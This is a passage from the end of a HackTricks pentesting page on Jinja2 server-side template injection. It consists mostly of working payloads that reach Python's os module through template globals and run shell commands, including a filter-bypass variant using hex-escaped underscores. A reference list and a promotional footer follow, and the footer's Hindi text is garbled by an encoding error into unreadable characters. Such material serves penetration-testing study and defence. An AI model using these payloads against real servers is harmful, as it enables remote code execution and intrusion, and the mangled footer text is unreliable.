{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## рд╕рдВрджрд░реНрдн

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* рдпрд╣рд╛рдВ [attr trick to bypass blacklisted chars in here](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**ред

</details>
